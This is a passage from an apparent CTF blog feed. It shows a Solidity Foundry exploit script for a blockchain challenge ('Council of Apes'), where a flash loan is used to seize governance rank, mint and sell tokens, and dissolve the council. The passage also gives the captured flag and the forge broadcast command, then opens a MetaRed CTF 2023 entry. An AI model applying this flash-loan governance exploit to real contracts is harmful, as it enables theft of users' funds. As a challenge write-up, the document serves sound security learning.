&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(address owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;string memory name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;string memory symbol) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ERC20&lt;&#x2F;span&gt;&lt;span&gt;(name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;symbol) 
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_mint&lt;&#x2F;span&gt;&lt;span&gt;(owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;100_000_000&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;CouncilOfCapesAttack.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&#x2F;MyNewToken.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{IcyExchange} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;..&#x2F;src&#x2F;CouncilOfApes&#x2F;IcyExchange.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Setup} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;..&#x2F;src&#x2F;CouncilOfApes&#x2F;Setup.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Script} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{console} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract AttackScript is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;{value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;ether&lt;&#x2F;span&gt;&lt;span&gt;}()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Attack Success&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack {
&lt;&#x2F;span&gt;&lt;span&gt;    MyNewToken public myToken &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;MyNewToken&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;My New H4ck3r Token&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;H4CK&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    Setup public setup &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Setup&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x821B54EfB659A64d5b0A3145811b290A997705C0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    IcyExchange public TARGET &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;setup&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;TARGET&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    address public _icyToken &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;icyToken&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 public theEvilWords &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Kevin come out of the basement, dinner is ready.&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() payable{
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;value &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10 &lt;&#x2F;span&gt;&lt;span&gt;ether)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F;Become an ape
&lt;&#x2F;span&gt;&lt;span&gt;        bytes32 holyWords &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;I hereby swear to ape into every shitcoin I see, to never sell, to never surrender, to never give up, to never stop buying, to never stop hodling, to never stop aping, to never stop believing, to never stop dreaming, to never stop hoping, to never stop loving, to never stop living, to never stop breathing&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;council&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;becomeAnApe&lt;&#x2F;span&gt;&lt;span&gt;(holyWords)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; create a pool on IcyExchange
&lt;&#x2F;span&gt;&lt;span&gt;        myToken&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(TARGET)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;100_000&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;createPool{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span&gt;ether}(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(myToken))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Take flash loan
&lt;&#x2F;span&gt;&lt;span&gt;        myToken&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(TARGET)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span&gt;(uint256)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;max)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; we dont know how many tokens it needs, give as much as possible
&lt;&#x2F;span&gt;&lt;span&gt;        TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;collateralizedFlashloan&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(myToken)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1_000_000_000&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;receiveFlashLoan&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 amount&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;icyToken&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;council&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;council&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;buyBanana&lt;&#x2F;span&gt;&lt;span&gt;(amount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;council&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;vote&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;council&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;claimNewRank&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;council&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;issueBanana&lt;&#x2F;span&gt;&lt;span&gt;(amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;council&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sellBanana&lt;&#x2F;span&gt;&lt;span&gt;(amount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;icyToken&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(TARGET)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;council&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;dissolveCouncilOfTheApes&lt;&#x2F;span&gt;&lt;span&gt;(theEvilWords)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;fallback&lt;&#x2F;span&gt;&lt;span&gt;() external payable { }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F;gctf{M0nkee5_4re_inD33d_t0g3ther_str0ng3r}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To solve run this command&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;forge&lt;&#x2F;span&gt;&lt;span&gt; script script&#x2F;CouncilOfApesAttack&#x2F;CouncilOfApesAttack.s.sol:AttackScript&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;RPC-URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;-private-key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;REDACTED&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;-broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Note that understanding entire protocol is necessary to solve this challenge.&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;Thank you for visiting!!!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>MetaRed CTF 2023</title>
        <published>2023-10-26T00:00:00+00:00</published>
        <updated>2023-10-26T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/metaredctf23/"/>
        <id>https://themj0ln1r.github.io/writeups/metaredctf23/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/metaredctf23/">&lt;p&gt;Hello mate, I played &lt;a href=&quot;https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;2107&quot; target=_blank&gt;MetaRedCTF&lt;&#x2F;a&gt;. I am too late to the party got few hours to play, but solved few blockchain challenges. Challenges are not available after CTF, so I can&#x27;t explain in detail what the challenge is. I try my best to explain what I did.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;blockchain&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#blockchain&quot; aria-label=&quot;Anchor link for: blockchain&quot;&gt;Blockchain&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;givememoney-500pts&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#givememoney-500pts&quot; aria-label=&quot;Anchor link for: givememoney-500pts&quot;&gt;GiveMeMoney [500pts]&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Challenge is to find network and contract method to call. We are given with contract address.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;0xA2720666b2e3D878b0E7FC80bc1D02958EA648DE&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
